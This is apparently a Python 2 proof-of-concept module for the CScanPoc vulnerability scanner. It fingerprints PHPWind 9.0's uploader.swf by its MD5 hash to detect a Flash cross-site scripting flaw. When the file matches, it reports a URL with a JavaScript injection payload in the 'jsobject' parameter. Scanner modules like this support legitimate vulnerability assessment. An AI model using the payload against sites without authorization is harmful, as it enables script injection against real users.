# coding: utf-8
import md5
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0113' # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /res/images/uploader.swf 跨站脚本' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-09'  # 漏洞公布时间
    desc = '''
    PHPWind 9.0 /res/images/uploader.swf文件存在FlashXss漏洞。
    ''' # 漏洞描述
    ref = 'Unknown'# 漏洞来源http://www.wooyun.org/bugs/wooyun-2013-017728
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0b1c6c01-7cfa-4adb-ba65-c23fcdbdf985' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            flash_md5 = "d85c815bc39c91725f264f291db70432"
            verify_url = self.target + "/res/images/uploader.swf"
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            md5_value = md5.new(content).hexdigest()
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;xss_url={xss_url}'.format(
                            target=self.target, name=self.vuln.name,xss_url=verify_url + '?jsobject=alert(1))}catch(e){}//'))
                
                
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()